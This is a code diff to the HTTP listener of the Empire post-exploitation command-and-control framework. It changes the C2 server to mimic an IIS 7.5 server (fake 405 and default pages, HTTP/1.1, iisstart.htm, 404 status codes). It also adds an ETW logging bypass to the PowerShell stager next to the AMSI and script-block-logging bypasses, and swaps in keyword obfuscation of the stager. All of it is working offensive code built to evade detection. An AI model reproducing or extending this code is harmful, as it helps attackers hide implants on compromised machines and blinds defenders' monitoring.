@@ -1,29 +1,30 @@
 from __future__ import print_function
-from builtins import str
-from builtins import object
-import logging
+
 import base64
-import sys
-import random
-import string
-import os
-import ssl
-import time
 import copy
 import json
+import logging
+import os
+import random
+import ssl
+import string
 import sys
 import threading
-from pydispatch import dispatcher
+import time
+from builtins import object
+from builtins import str
+
 from flask import Flask, request, make_response, send_from_directory
+from werkzeug.serving import WSGIRequestHandler
+from pydispatch import dispatcher
+
+from lib.common import bypasses
+from lib.common import encryption
 # Empire imports
 from lib.common import helpers
-from lib.common import agents
-from lib.common import encryption
-from lib.common import packets
-from lib.common import messages
-from lib.common import templating
 from lib.common import obfuscation
-from lib.common import bypasses
+from lib.common import packets
+from lib.common import templating
 
 
 class Listener(object):
@@ -193,7 +194,7 @@ class Listener(object):
         Returns an IIS 7.5 404 not found page.
         """
         
-        return '\n'.join([
+        return '\r\n'.join([
             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
             '<html xmlns="http://www.w3.org/1999/xhtml">',
             '<head>',
@@ -202,10 +203,10 @@ class Listener(object):
             '<style type="text/css">',
             '<!--',
             'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
-            'fieldset{padding:0 15px 10px 15px;}',
+            'fieldset{padding:0 15px 10px 15px;} ',
             'h1{font-size:2.4em;margin:0;color:#FFF;}',
-            'h2{font-size:1.7em;margin:0;color:#CC0000;}',
-            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
             '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
             'background-color:#555555;}',
             '#content{margin:0 0 0 2%;position:relative;}',
@@ -226,12 +227,49 @@ class Listener(object):
             ' ' * self.header_offset,  # randomize the length of the header to evade signature based detection
         ])
     
+    def method_not_allowed_page(self):
+        """
+        Imitates IIS 7.5 405 "method not allowed" page.
+        """
+
+        return '\r\n'.join([
+            '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
+            '<html xmlns="http://www.w3.org/1999/xhtml">',
+            '<head>',
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"/>',
+            '<title>405 - HTTP verb used to access this page is not allowed.</title>',
+            '<style type="text/css">',
+            '<!--',
+            'body{margin:0;font-size:.7em;font-family:Verdana, Arial, Helvetica, sans-serif;background:#EEEEEE;}',
+            'fieldset{padding:0 15px 10px 15px;} ',
+            'h1{font-size:2.4em;margin:0;color:#FFF;}',
+            'h2{font-size:1.7em;margin:0;color:#CC0000;} ',
+            'h3{font-size:1.2em;margin:10px 0 0 0;color:#000000;} ',
+            '#header{width:96%;margin:0 0 0 0;padding:6px 2% 6px 2%;font-family:"trebuchet MS", Verdana, sans-serif;color:#FFF;',
+            'background-color:#555555;}',
+            '#content{margin:0 0 0 2%;position:relative;}',
+            '.content-container{background:#FFF;width:96%;margin-top:8px;padding:10px;position:relative;}',
+            '-->',
+            '</style>',
+            '</head>',
+            '<body>',
+            '<div id="header"><h1>Server Error</h1></div>',
+            '<div id="content">',
+            ' <div class="content-container"><fieldset>',
+            '  <h2>405 - HTTP verb used to access this page is not allowed.</h2>',
+            '  <h3>The page you are looking for cannot be displayed because an invalid method (HTTP verb) was used to attempt access.</h3>',
+            ' </fieldset></div>',
+            '</div>',
+            '</body>',
+            '</html>\r\n'
+        ])
+
     def index_page(self):
         """
         Returns a default HTTP server page.
         """
         
-        return '\n'.join([
+        return '\r\n'.join([
             '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">',
             '<html xmlns="http://www.w3.org/1999/xhtml">',
             '<head>',
@@ -240,16 +278,16 @@ class Listener(object):
             '<style type="text/css">',
             '<!--',
             'body {',
-            '    color:#000000;',
-            '    background-color:#B3B3B3;',
-            '    margin:0;',
+            '	color:#000000;',
+            '	background-color:#B3B3B3;',
+            '	margin:0;',
             '}',
             '',
             '#container {',
-            '    margin-left:auto;',
-            '    margin-right:auto;',
-            '    text-align:center;',
-            '    }',
+            '	margin-left:auto;',
+            '	margin-right:auto;',
+            '	text-align:center;',
+            '	}',
             '',
             'a img {',
             '    border:none;',
@@ -285,7 +323,7 @@ class Listener(object):
     
     def generate_launcher(self, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default',
                           proxy='default', proxyCreds='default', stagerRetries='0', language=None, safeChecks='',
-                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False):
+                          listenerName=None, scriptLogBypass=True, AMSIBypass=True, AMSIBypass2=False, ETWBypass=False):
         """
         Generate a basic launcher for the specified listener.
         """
@@ -321,6 +359,8 @@ class Listener(object):
                     # ScriptBlock Logging bypass
                 if scriptLogBypass:
                     stager += bypasses.scriptBlockLogBypass()
+                if ETWBypass:
+                    stager += bypasses.ETWBypass()
                 # @mattifestation's AMSI bypass
                 if AMSIBypass:
                     stager += bypasses.AMSIBypass()
@@ -577,12 +617,9 @@ class Listener(object):
             # Get the random function name generated at install and patch the stager with the proper function name
             conn = self.get_db_connection()
             self.lock.acquire()
-            cur = conn.cursor()
-            cur.execute("SELECT Invoke_Empire FROM functions")
-            replacement = cur.fetchone()
-            cur.close()
+            stager = helpers.keyword_obfuscation(stager)
             self.lock.release()
-            stager = stager.replace("Invoke-Empire", replacement[0])
+
 
             # make sure the server ends with "/"
             if not host.endswith("/"):
@@ -707,13 +744,10 @@ class Listener(object):
             # Get the random function name generated at install and patch the stager with the proper function name
             conn = self.get_db_connection()
             self.lock.acquire()
-            cur = conn.cursor()
-            cur.execute("SELECT Invoke_Empire FROM functions")
-            replacement = cur.fetchone()
-            cur.close()
+            code = helpers.keyword_obfuscation(code)
             self.lock.release()
 
-            code = code.replace("Invoke-Empire", replacement[0])
+
             
             # patch in the comms methods
             commsCode = self.generate_comms(listenerOptions=listenerOptions, language=language)
@@ -959,6 +993,9 @@ def send_message(packets=None):
         app = Flask(__name__)
         self.app = app
         
+        # Set HTTP/1.1 as in IIS 7.5 instead of /1.0
+        WSGIRequestHandler.protocol_version = "HTTP/1.1"
+
         @app.route('/download/<stager>')
         def send_stager(stager):
             if 'po' in stager:
@@ -1006,8 +1043,15 @@ def send_message(packets=None):
             response.headers['Expires'] = "0"
             return response
         
+        @app.errorhandler(405)
+        def handle_405(e):
+            """
+            Returns IIS 7.5 405 page for every Flask 405 error.
+            """
+            return make_response(self.method_not_allowed_page(), 405)
+
         @app.route('/')
-        @app.route('/index.html')
+        @app.route('/iisstart.htm')
         def serve_index():
             """
             Return default server web page if user navigates to index.
@@ -1015,16 +1059,7 @@ def send_message(packets=None):
             
             static_dir = self.mainMenu.installPath + "data/misc/"
             return make_response(self.index_page(), 200)
-        
-        @app.route('/welcome.png')
-        def serve_index_helper():
-            """
-            Serves image loaded by index page.
-            """
-            
-            static_dir = self.mainMenu.installPath + "data/misc/"
-            return send_from_directory(static_dir, 'welcome.png')
-        
+               
         @app.route('/<path:request_uri>', methods=['GET'])
         def handle_get(request_uri):
             """
@@ -1033,6 +1068,14 @@ def send_message(packets=None):
             This is used during the first step of the staging process,
             and when the agent requests taskings.
             """
+            if request_uri.lower() == 'welcome.png':
+                # Serves image loaded by index page.
+                #
+                # Thanks to making it case-insensitive it works the same way as in 
+                # an actual IIS server
+                static_dir = self.mainMenu.installPath + "data/misc/"
+                return send_from_directory(static_dir, 'welcome.png')
+
             clientIP = request.remote_addr
             
             listenerName = self.options['Name']['Value']
@@ -1134,7 +1177,7 @@ def send_message(packets=None):
                     'message': message
                 })
                 dispatcher.send(signal, sender="listeners/http/{}".format(listenerName))
-                return make_response(self.default_response(), 200)
+                return make_response(self.default_response(), 404)
         
         @app.route('/<path:request_uri>', methods=['POST'])
         def handle_post(request_uri):
